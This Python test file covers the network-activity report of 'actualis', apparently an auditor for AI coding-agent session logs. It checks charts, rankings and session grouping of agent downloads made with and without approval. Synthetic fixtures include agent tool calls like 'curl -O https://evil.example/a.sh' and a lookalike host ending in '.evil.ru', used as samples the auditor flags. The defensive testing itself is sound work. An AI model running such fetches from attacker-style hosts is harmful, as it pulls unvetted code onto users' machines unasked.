"""The --network chart strip, rankings and session grouping (actualis-pro #77).

Every number a chart draws must be one --json carries, and the new JSON
series must reconcile with the totals. All synthetic."""
from __future__ import annotations

import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
if "actualis" in sys.modules:
    af = sys.modules["actualis"]
else:
    spec = importlib.util.spec_from_file_location("actualis", ROOT / "actualis.py")
    af = importlib.util.module_from_spec(spec)
    sys.modules["actualis"] = af
    spec.loader.exec_module(af)

S1 = "aaaa1111-0000-4000-8000-000000000001"
S2 = "bbbb2222-0000-4000-8000-000000000002"
S3 = "cccc3333-0000-4000-8000-000000000003"
PROJ_A = "-Users-x-orbital-ledger"
PROJ_B = "-Users-x-" + "a-very-long-project-directory-name-" * 3


def call(tid, cmd, sid, ts, mode="bypassPermissions", why=None, name="Bash"):
    blocks = ([{"type": "text", "text": why}] if why else []) + [
        {"type": "tool_use", "id": tid, "name": name,
         "input": {"command": cmd} if name == "Bash" else {"url": cmd}}]
    return {"type": "assistant", "timestamp": ts, "permissionMode": mode, "sessionId": sid,
            "message": {"id": "m" + tid, "role": "assistant", "content": blocks,
                        "usage": {"input_tokens": 1, "output_tokens": 1}}}


def user(text, sid, ts):
    return {"type": "user", "timestamp": ts, "sessionId": sid,
            "message": {"role": "user", "content": text}}


# Project A, session S1: a burst on 10-01 and one more on 10-03 (10-02 is empty).
SESSION_1 = [
    user("set up the repo", S1, "2026-10-01T09:00:00Z"),
    call("toolu_a1", "npm install left-pad@1.3.0", S1, "2026-10-01T09:01:00Z",
         why="Installing the padding helper."),
    call("toolu_a2", "npm install lodash", S1, "2026-10-01T09:02:00Z"),
    call("toolu_a3", "curl -O https://evil.example/a.sh", S1, "2026-10-01T09:03:00Z"),
    call("toolu_a4", "git clone https://github.com/acme/tool", S1, "2026-10-03T10:00:00Z",
         mode="default"),
]
# Project B, session S2: newest session, all on 10-06.
SESSION_2 = [
    user("fetch the docs", S2, "2026-10-06T12:00:00Z"),
    call("toolu_b1", "curl -O https://evil.example/b.sh", S2, "2026-10-06T12:01:00Z",
         why="Grabbing the second script."),
    call("toolu_b2", "curl -O https://evil.example/c.sh", S2, "2026-10-06T12:02:00Z"),
    call("toolu_b3", "pip install requests==2.32.3", S2, "2026-10-06T12:03:00Z"),
    call("toolu_b4", "https://" + "very-long-subdomain-label." * 3 + "example.org/x",
         S2, "2026-10-06T12:04:00Z", name="WebFetch", mode="default"),
]
# Project A, session S3: default mode only, so nothing unasked.
SESSION_3 = [
    user("search", S3, "2026-10-04T08:00:00Z"),
    call("toolu_c1", "npm install lodash", S3, "2026-10-04T08:01:00Z", mode="default"),
]


class Charts(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        base = Path(self._tmp.name)
        self.root = base / "projects"
        for proj, sid, recs in ((PROJ_A, S1, SESSION_1), (PROJ_B, S2, SESSION_2),
                                (PROJ_A, S3, SESSION_3)):
            (self.root / proj).mkdir(parents=True, exist_ok=True)
            (self.root / proj / f"{sid}.jsonl").write_text(
                "\n".join(json.dumps(r) for r in recs) + "\n")
        self.home = base / "home"
        self.home.mkdir()

    def env(self):
        return {"HOME": str(self.home), "XDG_CONFIG_HOME": str(self.home / ".config"),
                "NO_COLOR": "1"}

    def run_main(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        old = os.getcwd()
        os.chdir(self.home)
        try:
            with mock.patch.dict(os.environ, self.env()), redirect_stdout(out), redirect_stderr(err):
                try:
                    code = af.main([*argv, "--root", str(self.root), "--days", "3650"])
                except SystemExit as exc:
                    code = exc.code
        finally:
            os.chdir(old)
        self.assertEqual(code, 0, err.getvalue())
        return out.getvalue()

    def net(self, *argv):
        return json.loads(self.run_main("--network", "--json", *argv))

    def assert_fits(self, text):
        for line in text.splitlines():
            self.assertLessEqual(len(line), 100, line)

    def section(self, out, title):
        """Lines from the one starting with `title` (after indent) to the next
        blank line or the next upper-case section title."""
        lines = out.splitlines()
        start = next(k for k, l in enumerate(lines) if l.strip().startswith(title))
        body = []
        for l in lines[start + 1:]:
            if not l.strip() or re.match(r"^  [A-Z][A-Z ,]+(\s{2,}|$)", l):
                break
            body.append(l)
        return body


class TestJsonSeries(Charts):
    def test_by_day_counts_every_dated_item_once(self):
        n = self.net()
        self.assertEqual([d["date"] for d in n["by_day"]],
                         ["2026-10-01", "2026-10-03", "2026-10-04", "2026-10-06"])
        self.assertEqual([(d["items"], d["unasked"]) for d in n["by_day"]],
                         [(3, 3), (1, 0), (1, 0), (4, 3)])
        self.assertEqual(n["by_day_undated"], 0)
        self.assertEqual(sum(d["items"] for d in n["by_day"]) + n["by_day_undated"],
                         n["totals"]["items"])

    def test_by_project_and_package_unasked(self):
        n = self.net()
        rows = {p["project"]: (p["items"], p["unasked"]) for p in n["by_project"]}
        self.assertEqual(sum(v[0] for v in rows.values()), n["totals"]["items"])
        self.assertEqual(sum(v[1] for v in rows.values()), n["totals"]["unasked"])
        self.assertEqual(len(rows), 2)
        self.assertEqual([p["items"] for p in n["by_project"]],
                         sorted((p["items"] for p in n["by_project"]), reverse=True))
        lodash = next(p for p in n["packages"] if p["name"] == "lodash")
        self.assertEqual((lodash["count"], lodash["unasked"]), (2, 1))

    def test_reconciles_and_catches_a_bad_series(self):
        n = self.net()
        self.assertEqual(af.network_reconciles(n), [])
        n["by_day"][0]["items"] += 1
        self.assertTrue(any("by_day" in p for p in af.network_reconciles(n)))
        n = self.net()
        n["by_project"][0]["unasked"] += 1
        self.assertTrue(any("by_project" in p for p in af.network_reconciles(n)))

    def test_series_follow_the_filters(self):
        n = self.net("--session", "bbbb")
        self.assertEqual([d["date"] for d in n["by_day"]], ["2026-10-06"])
        self.assertEqual(len(n["by_project"]), 1)


class TestChartStrip(Charts):
    def test_strip_order_and_fit(self):
        out = self.run_main("--network")
        self.assert_fits(out)
        self.assertNotIn("\x1b", out)
        labels = [l.split()[0] for l in out.splitlines()
                  if re.match(r"^  (approval|per day|unasked |kind)", l)]
        self.assertEqual(labels, ["approval", "per", "unasked", "kind"])

    def test_approval_bar_and_counts_match_json(self):
        n = self.net()
        out = self.run_main("--network")
        line = next(l for l in out.splitlines() if l.startswith("  approval"))
        t = n["totals"]
        self.assertIn(f"unasked {t['unasked']}", line)
        self.assertIn(f"unknown {t['unknown']}", line)
        self.assertIn(f"asked {t['asked']}", line)
        self.assertIn("█", line)                    # unasked share drawn solid

    def test_per_day_spans_the_window_with_empty_days(self):
        out = self.run_main("--network")
        day = next(l for l in out.splitlines() if l.startswith("  per day"))
        spark = day[12:12 + 6]                           # 10-01 .. 10-06, one cell a day
        self.assertEqual(len(spark), 6)
        self.assertEqual(spark[1], " ")                  # 10-02: nothing
        self.assertEqual(spark[5], "█")             # 10-06: the peak
        self.assertIn("2026-10-01 → 2026-10-06", day)
        self.assertIn("peak 4 on 2026-10-06", day)
        un = next(l for l in out.splitlines() if l.startswith("  unasked "))
        self.assertEqual(un[12:12 + 6][2], " ")          # 10-03 had one, not unasked

    def test_one_day_says_so_instead_of_a_sparkline(self):
        out = self.run_main("--network", "--session", "bbbb")
        day = next(l for l in out.splitlines() if l.startswith("  per day"))
        self.assertIn("all on 2026-10-06", day)

    def test_kind_mix_matches_json(self):
        n = self.net()
        out = self.run_main("--network")
        line = next(l for l in out.splitlines() if l.startswith("  kind"))
        for k, v in n["by_kind"].items():
            if v:
                self.assertIn(f"{k} {v}", line)
            else:
                self.assertNotIn(k, line)


class TestRankings(Charts):
    def test_top_hosts_match_json(self):
        n = self.net()
        out = self.run_main("--network")
        rows = self.section(out, "TOP HOSTS")
        for h in n["hosts"][:3]:
            row = next(r for r in rows if r.strip().startswith(h["host"][:20]))
            self.assertIn(f"{h['unasked']} / {h['count']}", row)
        first = rows[0].split()[0]
        self.assertEqual(first, "evil.example")         # most unasked first

    def test_top_packages_match_json(self):
        n = self.net()
        out = self.run_main("--network")
        rows = self.section(out, "TOP PACKAGES")
        for p in n["packages"]:
            row = next(r for r in rows if f" {p['name']} " in r)
            self.assertIn(f"{p['unasked']} / {p['count']}", row)
        self.assertTrue(any("unpinned" in r for r in rows if " lodash " in r))

    def test_by_project_only_with_two_or_more(self):
        out = self.run_main("--network")
        rows = self.section(out, "BY PROJECT")
        self.assertEqual(len(rows), 2)
        out = self.run_main("--network", "--session", "bbbb")
        self.assertNotIn("BY PROJECT", out)

    def test_the_duplicate_newest_first_list_is_gone(self):
        out = self.run_main("--network")
        self.assertFalse([l for l in out.splitlines() if l.startswith("  UNASKED  ")])
        self.assertNotIn("TOP UNASKED", out)


class TestSessions(Charts):
    def test_unasked_grouped_by_session_newest_first(self):
        out = self.run_main("--network")
        rows = self.section(out, "UNASKED, BY SESSION")
        heads = [r for r in rows if re.match(r"^    \d{4}-", r)]
        self.assertEqual(len(heads), 2)                  # S3 has nothing unasked
        self.assertIn("bbbb2222", heads[0])
        self.assertIn("4 downloads, 3 unasked", heads[0])
        self.assertIn("aaaa1111", heads[1])
        self.assertIn("4 downloads, 3 unasked", heads[1])
        text = "\n".join(rows)
        self.assertIn("why: Grabbing the second script.", text)
        self.assertIn("→ actualis --network --session bbbb2222", text)
        self.assertIn("→ actualis --network --session aaaa1111", text)

    def test_filtered_blocks_carry_a_session_line(self):
        out = self.run_main("--network", "--host", "evil.example")
        self.assert_fits(out)
        self.assertIn("approval", out)                   # the strip, on the filtered set
        sess = [l for l in out.splitlines() if l.startswith("  session ")]
        self.assertEqual(len(sess), 2)
        self.assertIn("bbbb2222", sess[0])


class TestFallbacks(Charts):
    def test_ascii_terminal_gets_ascii_charts(self):
        env = {**os.environ, **self.env(), "PYTHONIOENCODING": "ascii"}
        p = subprocess.run([sys.executable, str(ROOT / "actualis.py"), "--network",
                            "--root", str(self.root), "--days", "3650"],
                           capture_output=True, env=env, cwd=str(self.home))
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertNotIn(b"Traceback", p.stderr)
        out = p.stdout.decode("ascii")                   # raises if anything slipped through
        line = next(l for l in out.splitlines() if l.startswith("  approval"))
        self.assertIn("#", line)

    def test_explain_names_a_json_path_for_every_chart(self):
        out = self.run_main("--explain", "network")
        for path in (".totals", ".by_day", ".by_kind", ".hosts", ".packages", ".by_project"):
            self.assertIn(path, out)


def render(fn, *args):
    buf = io.StringIO()
    with redirect_stdout(buf):
        fn(*args)
    return buf.getvalue()


def fleet_of(spec):
    """spec: (command, datetime, mode) per item, all in project p."""
    f = af.Fleet()
    for cmd, ts, mode in spec:
        f.add_tool("p", "Bash", {"command": cmd}, ts, mode)
    af.apply_network_policy(f, af.parse_trust([]), strict=False)
    return f


class TestReviewFixes(unittest.TestCase):
    """Edge cases from the review of the first cut (#77)."""

    def test_a_far_future_date_does_not_crash_or_stall(self):
        from datetime import datetime, timezone
        f = fleet_of([("npm install a", datetime(2026, 10, 1, tzinfo=timezone.utc), "auto"),
                      ("npm install b", datetime(9999, 12, 31, 12, tzinfo=timezone.utc), "auto")])
        out = render(af.render_network, f, af.C(False), 12)
        self.assertIn("2026-10-01 \u2192 9999-12-31", out)
        for line in out.splitlines():
            self.assertLessEqual(len(line), 100, line)

    def test_a_chart_failure_never_takes_the_report_down(self):
        n = {"totals": {"items": 1, "asked": 0, "unasked": 1, "unknown": 0},
             "by_day": [{"date": "not-a-date", "items": 1, "unasked": 1},
                        {"date": "2026-10-01", "items": 0, "unasked": 0}],
             "by_day_undated": 0, "by_kind": {"fetch": 1}}
        out = render(af._render_network_strip, n, af.C(False))
        self.assertIn("charts unavailable", out)

    def test_the_undated_note_is_whole_or_absent(self):
        n = {"totals": {"items": 1234667, "asked": 0, "unasked": 0, "unknown": 1234667},
             "by_day": [{"date": "2026-09-01", "items": 1234567, "unasked": 0},
                        {"date": "2026-10-06", "items": 2, "unasked": 0}],
             "by_day_undated": 98765, "by_kind": {"fetch": 1234667}}
        out = render(af._render_network_strip, n, af.C(True))
        day = next(l for l in out.splitlines() if "per day" in l)
        plain = re.sub(r"\x1b\[[0-9;]*m", "", day)
        self.assertLessEqual(len(plain), 100, plain)
        self.assertTrue("98,765 undated" in plain or "undated" not in plain, plain)
        self.assertEqual(day.count("\x1b[2m"), day.count("\x1b[0m"), day)

    def test_long_hosts_keep_their_registrable_end(self):
        got = af._net_host_clip("objects.githubusercontent.com.evil.ru", 24)
        self.assertTrue(got.startswith("\u2026") and got.endswith(".evil.ru"), got)
        self.assertLessEqual(len(got), 24)
        self.assertEqual(af._net_host_clip("a.io", 24), "a.io")
        self.assertEqual(len(af._net_host_clip("x" * 60 + ".io", 24)), 24)
        f = fleet_of([("curl -O https://objects.githubusercontent.com.evil.ru/x",
                       af.datetime(2026, 10, 1, tzinfo=af.timezone.utc), "auto")])
        out = render(af.render_network, f, af.C(False), 12)
        self.assertNotIn("githubuserconte\u2026", out)
        hosts = [l for l in out.splitlines() if l.startswith("    \u2026")]
        self.assertTrue(hosts and all(".evil.ru " in l for l in hosts), out)   # TOP HOSTS row

    def test_by_day_is_the_utc_date(self):
        from datetime import datetime, timedelta, timezone
        late = datetime(2026, 10, 1, 23, 30, tzinfo=timezone(timedelta(hours=-5)))
        f = fleet_of([("curl https://a.io/x", late, "auto")])
        n = af.network_json(f)
        self.assertEqual([d["date"] for d in n["by_day"]], ["2026-10-02"])

    def test_huge_counts_still_fit(self):
        from datetime import datetime, timezone
        f = fleet_of([("curl https://a.io/x", datetime(2026, 10, 1, tzinfo=timezone.utc), "auto")])
        n = af.network_json(f)
        n["hosts"][0].update(count=148148136, unasked=148148136)
        with mock.patch.object(af, "network_json", lambda *a, **k: n), \
                mock.patch.object(af, "network_reconciles", lambda n: []):
            out = render(af.render_network, f, af.C(False), 12)
        self.assertIn("148,148,136 / 148,148,136", out)
        for line in out.splitlines():
            self.assertLessEqual(len(line), 100, line)

    def test_every_nonzero_share_gets_a_cell(self):
        bar = af._net_approval_bar({"unasked": 1, "unknown": 2000000, "asked": 0}, 32)
        self.assertEqual(len(bar), 32)
        self.assertEqual(bar.count("\u2588"), 1)
        bar = af._net_bar(999, 1000, 1000, 20)
        self.assertIn("\u2591", bar)                       # the one not unasked still shows
        self.assertEqual(af._net_bar(1000, 1000, 1000, 20), "\u2588" * 20)


if __name__ == "__main__":
    unittest.main()
